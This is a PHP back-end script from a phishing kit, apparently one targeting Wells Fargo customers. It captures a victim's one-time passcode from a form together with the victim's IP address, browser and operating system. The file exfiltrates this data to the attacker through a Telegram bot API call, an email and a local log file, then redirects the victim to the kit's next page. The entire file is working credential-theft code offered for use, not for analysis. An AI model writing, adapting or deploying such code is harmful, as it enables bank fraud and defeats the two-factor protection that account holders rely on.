<?php

/* 

 __,  ,_    _    ,  ,  ,  ,  ,    ___, ,  , 
'|_,  |_)  '|\   |\ |  |_/   |   ' |   |\ | 
 |   '| \   |-\  |'\| '| \  '|__  _|_, |'\| 
 '    '  `  '  ` '  `  '  `    ' '     '  ` 
                                                                                                                       
 */
session_start();

$ip = getenv("REMOTE_ADDR");
require '../main.php';
require '../config/EMAIL.php';
// Copyright - Franklin.
$Wells_SESSION_Mafiso = base64_encode(time().sha1($_SERVER['REMOTE_ADDR'].$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));
                $key = substr(sha1(mt_rand()),1,30);
if($_POST['otp'] == "") {
  header('HTTP/1.0 403 Forbidden');
exit();
}

$message .= "================| OTP INFORMATION |================\n";
$message .= "OTP 1 STEP: ".$_POST['otp']."\n";

$message .= "================| DEVICE INFORMATION |================\n";
$message .= "IP ADDRESS: ".$ip."\n";
$message .= "TIMEZONE: ".$timezone."\n";
$message .= "OS/BROWSER: ".$os."/".$br."\n";
$message .= "DATE: ".$date."\n";
$message .= "================| BY FRANKLIN |================\n";
$cc = $_POST['ccn'];
$subject = "OTP2 - [ ".$_POST['otp']." ] - [ $cn - $os - $br - $ip ]";
$headers = 'From: FRANKLIN <xiao@elee.cn>' . "\r\n" .
file_get_contents("https://api.telegram.org/bot".$telegram_http_api."/sendMessage?chat_id=".$telegram_chat_id."&text=" . urlencode($message)."" );
  $save=fopen("../logs.txt","a+");
fwrite($save,$message);
	fclose($save);
mail($email,$subject,$message,$headers);

header('location: ../ownership?session='.$key);
?>
